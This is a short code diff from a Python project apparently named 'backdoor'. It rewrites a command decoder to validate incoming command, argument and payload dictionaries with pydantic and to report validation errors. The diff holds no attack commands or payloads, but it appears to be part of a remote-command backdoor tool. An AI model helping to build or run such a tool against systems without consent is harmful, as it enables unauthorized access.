@@ -1,5 +1,7 @@
 from typing import Any
 
+from pydantic import ValidationError
+
 from backdoor.models.commands import Command
 from backdoor.serialization.decoders.decoder import Decoder
 from backdoor.serialization.decoders.exceptions import NotDecodableError
@@ -8,15 +10,10 @@ from backdoor.serialization.decoders.exceptions import NotDecodableError
 class CommandDecoder(Decoder):
 
     def decode(self, dct: dict[str, Any]) -> Command:
-        keys = "command", "args", "payload"
-        if set(keys) == dct.keys():
-            try:
-                return Command(
-                    command=dct["command"],
-                    args=dct["args"],
-                    payload=dct["payload"].encode() if dct["payload"] else None,
-                )
-            except AttributeError:
-                raise ValueError("Invalid payload type on decoding. Expected: str")
-        else:
-            raise NotDecodableError
+        try:
+            return Command.model_validate(dct)
+        except ValidationError as e:
+            err, *_ = e.errors()
+            loc, *_ = err.get("loc") or ("Unknown location",)
+            msg = err.get("msg") or "Something went wrong"
+            raise NotDecodableError(f"{msg} ({loc})")
